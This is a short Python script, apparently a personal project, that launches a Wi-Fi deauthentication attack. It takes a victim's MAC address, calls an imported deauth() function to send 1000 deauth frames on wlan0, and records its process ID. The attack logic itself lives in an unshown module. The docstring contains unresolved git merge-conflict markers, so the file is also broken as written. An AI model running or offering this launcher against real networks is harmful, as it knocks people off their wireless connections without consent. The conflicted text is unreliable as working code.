"""Written by Aiden Yoshioka-Miller
<<<<<<< HEAD

This is a very short script that minimizes the input that I need for my project to function. This is a bit unneeded, but it was kind of needed to get my deauth section working quicker.
=======
        
    This is a very short script that minimizes the input that I need for my project to function. This is a bit unneeded, but it was kind of needed to get my deauth section working quicker.
>>>>>>> aae8356b61268c451992a9db66b5d582a3119f9e
"""
from deauth import *
from scapy.all import *

from argparse import ArgumentParser as AP
import signal 
import sys
import os

if __name__ == "__main__":
    parser = AP(description="Perform Deauthentication attack against a computer")
    parser.add_argument("-t", "--target-mac",metavar="MAC",help="the MAC address of the victim's computer (Airodump-ng Station)")
    args = parser.parse_args()
    deauth("wlan0", 1000, args.target_mac, args.target_mac)

    myfile = "../.files/pid.txt"
    with open(myfile, "w") as f:
        f.write(str(os.getpid()))
